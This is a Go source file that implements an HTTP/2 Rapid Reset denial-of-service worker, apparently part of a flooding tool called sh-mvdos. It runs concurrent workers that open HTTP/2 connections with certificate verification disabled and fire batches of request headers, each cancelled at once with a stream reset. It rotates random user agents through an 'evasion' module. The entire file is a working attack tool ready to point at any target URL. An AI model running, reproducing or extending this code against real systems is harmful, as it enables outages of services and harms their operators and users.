package worker

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"sync/atomic"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type H2RapidReset struct {
	Target    string
	Workers   int
	Streams   int
	BatchSize int
}

func (w *H2RapidReset) Run(ctx context.Context) (uint64, uint64, error) {
	if w.Workers <= 0 {
		w.Workers = 4
	}
	if w.BatchSize <= 0 {
		w.BatchSize = 100
	}
	if w.Streams <= 0 {
		w.Streams = 1000
	}

	var reqs, errs atomic.Uint64
	done := make(chan struct{}, w.Workers)
	for i := 0; i < w.Workers; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				n, err := w.rapidResetSession(ctx, w.Target)
				reqs.Add(n)
				if err != nil {
					errs.Add(1)
				}
			}
		}()
	}
	<-ctx.Done()
	for i := 0; i < w.Workers; i++ {
		<-done
	}
	return reqs.Load(), errs.Load(), ctx.Err()
}

func (w *H2RapidReset) rapidResetSession(ctx context.Context, targetURL string) (uint64, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return 0, err
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "http" {
			port = "80"
		} else {
			port = "443"
		}
	}
	addr := net.JoinHostPort(host, port)

	useTLS := u.Scheme == "https" || u.Scheme == "wss" || port == "443"
	var rawConn net.Conn
	if !useTLS {
		d := net.Dialer{Timeout: dialTimeout}
		rawConn, err = d.DialContext(ctx, "tcp", addr)
		if err != nil {
			return 0, err
		}
	} else {
		d := net.Dialer{Timeout: dialTimeout}
		rawConn, err = tls.DialWithDialer(&d, "tcp", addr, &tls.Config{
			ServerName:         host,
			NextProtos:         []string{"h2", "http/1.1"},
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		})
		if err != nil {
			return 0, err
		}
		if tlsConn, ok := rawConn.(*tls.Conn); ok {
			if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
				rawConn.Close()
				return 0, fmt.Errorf("h2 not negotiated")
			}
		}
	}
	defer rawConn.Close()

	if _, err := rawConn.Write([]byte(http2.ClientPreface)); err != nil {
		return 0, err
	}

	bw := bufio.NewWriterSize(rawConn, 65536)
	framer := http2.NewFramer(bw, rawConn)
	framer.AllowIllegalWrites = true

	maxStreams := uint32(w.Streams)
	if maxStreams <= 0 {
		maxStreams = 1000
	}
	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: maxStreams},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	); err != nil {
		return 0, err
	}
	if err := bw.Flush(); err != nil {
		return 0, err
	}

	connDone := make(chan struct{})
	go func() {
		defer close(connDone)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			switch sf := f.(type) {
			case *http2.SettingsFrame:
				if !sf.IsAck() {
					_ = framer.WriteSettingsAck()
					_ = bw.Flush()
				}
			case *http2.GoAwayFrame:
				return
			}
		}
	}()

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	scheme := u.Scheme
	if scheme == "" {
		scheme = "https"
	}
	authority := u.Host
	if authority == "" {
		authority = host
	}

	batch := w.BatchSize
	if batch <= 0 {
		batch = 100
	}

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	var streamID uint32 = 1
	var sent uint64

	for {
		select {
		case <-ctx.Done():
			return sent, nil
		case <-connDone:
			return sent, fmt.Errorf("connection closed by server")
		default:
		}

		for i := 0; i < batch; i++ {
			if ctx.Err() != nil {
				return sent, ctx.Err()
			}
			hdrBuf.Reset()
			_ = enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
			_ = enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
			_ = enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
			_ = enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
			_ = enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: evasion.RandUA()})

			if err := framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:      streamID,
				BlockFragment: hdrBuf.Bytes(),
				EndStream:     true,
				EndHeaders:    true,
			}); err != nil {
				return sent, err
			}
			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
				return sent, err
			}
			sent++
			streamID += 2
			if streamID >= 1<<31-2 {
				_ = bw.Flush()
				return sent, nil
			}
		}
		if err := bw.Flush(); err != nil {
			return sent, err
		}
	}
}

func ParseH2Target(raw string) (string, error) {
	if raw == "" {
		return "", fmt.Errorf("empty target")
	}
	return raw, nil
}